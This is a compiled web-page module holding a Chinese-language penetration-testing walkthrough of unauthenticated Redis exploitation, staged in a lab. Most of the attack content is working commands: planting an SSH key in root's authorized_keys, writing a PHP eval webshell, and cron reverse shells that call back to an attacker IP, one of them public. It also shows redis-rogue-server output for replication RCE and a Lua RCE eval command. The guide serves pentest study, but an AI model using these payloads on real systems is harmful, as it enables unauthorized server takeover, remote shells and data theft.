import{_ as e}from"./plugin-vue_export-helper-DlAUqK2U.js";import{c as n,a,o as i}from"./app-DS0ZCcmM.js";const l={};function p(r,s){return i(),n("div",null,s[0]||(s[0]=[a(`<p>原理</p><p>漏洞利用</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>攻击机</span></span>
<span class="line"><span>kali  192.168.121.135</span></span>
<span class="line"><span>目标机</span></span>
<span class="line"><span>ubuntu 192.168.121.138</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="redis常用命令" tabindex="-1"><a class="header-anchor" href="#redis常用命令"><span>redis常用命令</span></a></h2><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>  set testkey &quot;Hello World&quot;         # 设置键testkey的值为字符串Hello World</span></span>
<span class="line"><span>  get testkey                       # 获取键testkey的内容</span></span>
<span class="line"><span>  SET score 99                      # 设置键score的值为99</span></span>
<span class="line"><span>  INCR score                        # 使用INCR命令将score的值增加1</span></span>
<span class="line"><span>  GET score                         # 获取键score的内容</span></span>
<span class="line"><span>  keys *                            # 列出当前数据库中所有的键</span></span>
<span class="line"><span>  get anotherkey                    # 获取一个不存在的键的值</span></span>
<span class="line"><span>  config set dir /home/test         # 设置工作目录</span></span>
<span class="line"><span>  config set dbfilename redis.rdb   # 设置备份文件名</span></span>
<span class="line"><span>  config get dir                    # 检查工作目录是否设置成功</span></span>
<span class="line"><span>  config get dbfilename             # 检查备份文件名是否设置成功</span></span>
<span class="line"><span>  save                              # 进行一次备份操作</span></span>
<span class="line"><span>  flushall 删除所有数据</span></span>
<span class="line"><span>  del key 删除键为key的数据</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现"><span>漏洞复现</span></a></h2><p>nmap扫描目标机端口，发现开放6379端口，服务为redis</p><p>尝试直接连接</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>攻击机:</span></span>
<span class="line"><span>redis-cli -h 192.168.121.138</span></span>
<span class="line"><span>192.168.121.138:6379&gt; info</span></span>
<span class="line"><span># Server</span></span>
<span class="line"><span>redis_version:3.2.11</span></span>
<span class="line"><span>redis_git_sha1:00000000</span></span>
<span class="line"><span>redis_git_dirty:0</span></span>
<span class="line"><span>redis_build_id:674c1c5898a9d86b</span></span>
<span class="line"><span>redis_mode:standalone</span></span>
<span class="line"><span>os:Linux 5.19.0-32-generic x86_64</span></span>
<span class="line"><span>#可直接无验证登录,存在未授权访问漏洞</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="公私钥认证" tabindex="-1"><a class="header-anchor" href="#公私钥认证"><span>公私钥认证</span></a></h3><p>安装ssh服务</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>靶机执行</span></span>
<span class="line"><span>sudo mkdir /root/.ssh</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>攻击机执行</span></span>
<span class="line"><span>ssh-keygen -t rsa </span></span>
<span class="line"><span>密码全部置为空</span></span>
<span class="line"><span>进入.ssh/目录，将生成的公钥保存到pub_key.txt中</span></span>
<span class="line"><span>(echo -e &quot;\\n\\n&quot;;cat id_rsa.pub;echo -e &quot;\\n\\n&quot;)&gt;pub_key.txt</span></span>
<span class="line"><span>#将生成的公钥写进目标redis</span></span>
<span class="line"><span>cat /root/.ssh/pub_key.txt | redis-cli -h 192.168.121.138 -x set pub_key</span></span>
<span class="line"><span>OK</span></span>
<span class="line"><span>#将redis默认备份路径改为/root/.ssh/ -- 可通过CONFIG GET dir 查看当前路径</span></span>
<span class="line"><span>CONFIG SET dir /root/.ssh/</span></span>
<span class="line"><span>#设置备份公钥为authorized_keys</span></span>
<span class="line"><span>CONFIG SET dbfilename authorized_keys</span></span>
<span class="line"><span>#写入完成，尝试ssh连接</span></span>
<span class="line"><span>ssh 192.168.121.138 </span></span>
<span class="line"><span>#若报错“ssh: connect to host 192.168.121.138 port 22: Connection refused”</span></span>
<span class="line"><span>#说明目标没有shh服务</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="绝对路径写shell" tabindex="-1"><a class="header-anchor" href="#绝对路径写shell"><span>绝对路径写shell</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>#目标要存在web服务，且知道根目录路径</span></span>
<span class="line"><span>攻击机执行</span></span>
<span class="line"><span>#如果没有目录，创建即可</span></span>
<span class="line"><span>config set dir /var/www/html </span></span>
<span class="line"><span>config set dbfilename redis.php  #把默认备份文件改为redis.php，为了后面写码</span></span>
<span class="line"><span>192.168.121.138:6379&gt; set shell &quot;&lt;?php @eval($_POST[&#39;1&#39;]);?&gt;&quot;</span></span>
<span class="line"><span>save</span></span>
<span class="line"><span>然后访问redis.php即可传参执行命令，可继续提权</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="反弹shell" tabindex="-1"><a class="header-anchor" href="#反弹shell"><span>反弹shell</span></a></h3><p>cron --linux下的定时执行任务</p><p>详细介绍:<a href="https://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/crontab.html" target="_blank" rel="noopener noreferrer">https://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/crontab.html</a></p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>/var/spool/cron/ 目录下存放的是每个用户包括root的crontab任务，每个任务以创建者的名字命名</span></span>
<span class="line"><span>/etc/crontab 这个文件负责调度各种管理和维护任务。</span></span>
<span class="line"><span>ubuntu中root默认路径/var/spool/cron/crontabs/root</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>config set dbfilename root</span></span>
<span class="line"><span>config set dir /var/spool/cron</span></span>
<span class="line"><span>SET xxx &quot;\\n\\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.121.135/7777 0&gt;&amp;1\\n\\n&quot;</span></span>
<span class="line"><span>set x &quot;\\n* * * * * bash -i &gt;&amp; dev/tcp/43.136.236.40/7777 0&gt;&amp;1\\n&quot;   --&gt;* * * * *代表每分钟执行一次命令</span></span>
<span class="line"><span>save</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="主从复制rce" tabindex="-1"><a class="header-anchor" href="#主从复制rce"><span>主从复制rce</span></a></h3><p>redis4.x新增模块功能，redis模块可以使用外部模块扩展redis,从而实现一个新的redis命令，通过写C语言编写出.so文件，redis模块为动态库，在启动或是MODEL LOAD时会将文件加载到库中，从而达到注入恶意.so文件的目的</p><p>原理:通过模拟恶意主机作为主节点，在目标机上设置主从复制，然后模拟<code>FULLRESYNC</code>执行全量复制操作，将恶意主机上的恶意so文件同步到目标主机并加载以执行系统恶意命令。</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>使用https://github.com/n0b0dyCN/redis-rogue-server工具，即可直接连接目标机获得shell</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>└─# ./redis-rogue-server.py --rhost 127.0.0.1  --lhost 127.0.0.1 --lport 8888</span></span>
<span class="line"><span>______         _ _      ______                         _____                          </span></span>
<span class="line"><span>| ___ \\       | (_)     | ___ \\                       /  ___|                         </span></span>
<span class="line"><span>| |_/ /___  __| |_ ___  | |_/ /___   __ _ _   _  ___  \\ \`--.  ___ _ ____   _____ _ __ </span></span>
<span class="line"><span>|    // _ \\/ _\` | / __| |    // _ \\ / _\` | | | |/ _ \\  \`--. \\/ _ \\ &#39;__\\ \\ / / _ \\ &#39;__|</span></span>
<span class="line"><span>| |\\ \\  __/ (_| | \\__ \\ | |\\ \\ (_) | (_| | |_| |  __/ /\\__/ /  __/ |   \\ V /  __/ |   </span></span>
<span class="line"><span>\\_| \\_\\___|\\__,_|_|___/ \\_| \\_\\___/ \\__, |\\__,_|\\___| \\____/ \\___|_|    \\_/ \\___|_|   </span></span>
<span class="line"><span>                                     __/ |                                            </span></span>
<span class="line"><span>                                    |___/                                             </span></span>
<span class="line"><span>@copyright n0b0dy @ r3kapig</span></span>
<span class="line"><span></span></span>
<span class="line"><span>[info] TARGET 127.0.0.1:6379</span></span>
<span class="line"><span>[info] SERVER 127.0.0.1:8888</span></span>
<span class="line"><span>[info] Setting master...</span></span>
<span class="line"><span>[info] Setting dbfilename...</span></span>
<span class="line"><span>[info] Loading module...</span></span>
<span class="line"><span>[info] Temerory cleaning up...</span></span>
<span class="line"><span>What do u want, [i]nteractive shell or [r]everse shell: i</span></span>
<span class="line"><span>[info] Interact mode start, enter &quot;exit&quot; to quit.</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="lua-rce" tabindex="-1"><a class="header-anchor" href="#lua-rce"><span>Lua RCE</span></a></h3><p>漏洞原理：FORLOOP操作码未验证数据类型导致读取内存指针；UpVal处理时的内存破坏</p><p>lua漏洞的详细介绍：<a href="https://gist.github.com/corsix/6575486" target="_blank" rel="noopener noreferrer">https://gist.github.com/corsix/6575486</a></p><p>环境搭建</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>centos6.5 + redis-2.6.16</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>下载可利用脚本，修改目标地址host</p><p><a href="https://github.com/QAX-A-Team/redis_lua_exploit/" target="_blank" rel="noopener noreferrer">https://github.com/QAX-A-Team/redis_lua_exploit/</a></p><p>执行后redis-cli连接目标redis执行</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>eval &quot;tonumber(&#39;id&#39;, 8)&quot; 0</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>即可执行id命令，若要更改命令，在id处修改即可，也可反弹shell</p><p>关于该漏洞的挖掘和分析</p><p><a href="https://www.anquanke.com/post/id/151203" target="_blank" rel="noopener noreferrer">https://www.anquanke.com/post/id/151203</a></p><h3 id="反序列化" tabindex="-1"><a class="header-anchor" href="#反序列化"><span>反序列化</span></a></h3><p>我们理解到的redis是一种小型数据库，在现实环境中redis可能会被用来存储序列化后的数据</p><p>利用思路就是将篡改好的恶意序列化数据添加到redis中，当该数据再次取出反序列化时除法反序列化漏洞</p><p>jackon反序列化</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>观察json对象是不是数组，第一个元素像不像类名</span></span>
<span class="line"><span>[&quot;com.blue.bean.User&quot;,xxx]</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><p>fastjson:关注有没有@type字段</p><p>jdk:观察value是不是base64,如果是解码后看里面有没有java包名</p><p>漏洞的具体利用流程：</p><p><a href="https://paper.seebug.org/1169/#_3" target="_blank" rel="noopener noreferrer">https://paper.seebug.org/1169/#_3</a></p><p>参考链接：</p><p><a href="https://xz.aliyun.com/t/5665#toc-8" target="_blank" rel="noopener noreferrer">https://xz.aliyun.com/t/5665#toc-8</a></p><p><a href="https://www.anquanke.com/post/id/151203#h3-3" target="_blank" rel="noopener noreferrer">https://www.anquanke.com/post/id/151203#h3-3</a></p><p><a href="https://www.mad-coding.cn/2020/01/16/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#1-2-1-%E5%AE%89%E8%A3%85redis" target="_blank" rel="noopener noreferrer">https://www.mad-coding.cn/2020/01/16/Redis未授权访问漏洞总结/#1-2-1-安装redis</a></p>`,50)]))}const c=e(l,[["render",p],["__file","Redis未授权漏洞.html.vue"]]),o=JSON.parse('{"path":"/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%A4%96%E7%BD%91%E6%BC%8F%E6%B4%9E/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E.html","title":"Redis未授权漏洞","lang":"zh-CN","frontmatter":{"title":"Redis未授权漏洞","date":"2023-09-03T07:29:52.000Z","updated":"2023-06-09T14:35:14.000Z","categories":["渗透测试","外网漏洞"],"description":"原理 漏洞利用 redis常用命令 漏洞复现 nmap扫描目标机端口，发现开放6379端口，服务为redis 尝试直接连接 公私钥认证 安装ssh服务 绝对路径写shell 反弹shell cron --linux下的定时执行任务 详细介绍:https://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/...","head":[["meta",{"property":"og:url","content":"https://mister-hope.github.io/articles/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%A4%96%E7%BD%91%E6%BC%8F%E6%B4%9E/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E.html"}],["meta",{"property":"og:site_name","content":"uu2fu3o的知识库"}],["meta",{"property":"og:title","content":"Redis未授权漏洞"}],["meta",{"property":"og:description","content":"原理 漏洞利用 redis常用命令 漏洞复现 nmap扫描目标机端口，发现开放6379端口，服务为redis 尝试直接连接 公私钥认证 安装ssh服务 绝对路径写shell 反弹shell cron --linux下的定时执行任务 详细介绍:https://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"og:updated_time","content":"2025-01-15T18:41:02.000Z"}],["meta",{"property":"article:published_time","content":"2023-09-03T07:29:52.000Z"}],["meta",{"property":"article:modified_time","content":"2025-01-15T18:41:02.000Z"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"Redis未授权漏洞\\",\\"image\\":[\\"\\"],\\"datePublished\\":\\"2023-09-03T07:29:52.000Z\\",\\"dateModified\\":\\"2025-01-15T18:41:02.000Z\\",\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"uu2fu3o\\",\\"url\\":\\"https://mister-hope.com\\"}]}"]]},"headers":[{"level":2,"title":"redis常用命令","slug":"redis常用命令","link":"#redis常用命令","children":[]},{"level":2,"title":"漏洞复现","slug":"漏洞复现","link":"#漏洞复现","children":[{"level":3,"title":"公私钥认证","slug":"公私钥认证","link":"#公私钥认证","children":[]},{"level":3,"title":"绝对路径写shell","slug":"绝对路径写shell","link":"#绝对路径写shell","children":[]},{"level":3,"title":"反弹shell","slug":"反弹shell","link":"#反弹shell","children":[]},{"level":3,"title":"主从复制rce","slug":"主从复制rce","link":"#主从复制rce","children":[]},{"level":3,"title":"Lua RCE","slug":"lua-rce","link":"#lua-rce","children":[]},{"level":3,"title":"反序列化","slug":"反序列化","link":"#反序列化","children":[]}]}],"git":{"createdTime":1736966462000,"updatedTime":1736966462000,"contributors":[{"name":"uu2fu3o","username":"uu2fu3o","email":"1027578439@qq.com","commits":1,"url":"https://github.com/uu2fu3o"}]},"readingTime":{"minutes":4.32,"words":1295},"filePathRelative":"渗透测试/外网漏洞/Redis未授权漏洞.md","localizedDate":"2023年9月3日","excerpt":"<p>原理</p>\\n<p>漏洞利用</p>\\n<div class=\\"language- line-numbers-mode\\" data-highlighter=\\"shiki\\" data-ext=\\"\\" data-title=\\"\\" style=\\"--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34\\"><pre class=\\"shiki shiki-themes one-light one-dark-pro vp-code\\"><code><span class=\\"line\\"><span>攻击机</span></span>\\n<span class=\\"line\\"><span>kali  192.168.121.135</span></span>\\n<span class=\\"line\\"><span>目标机</span></span>\\n<span class=\\"line\\"><span>ubuntu 192.168.121.138</span></span></code></pre>\\n<div class=\\"line-numbers\\" aria-hidden=\\"true\\" style=\\"counter-reset:line-number 0\\"><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div><div class=\\"line-number\\"></div></div></div>","autoDesc":true}');export{c as comp,o as data};
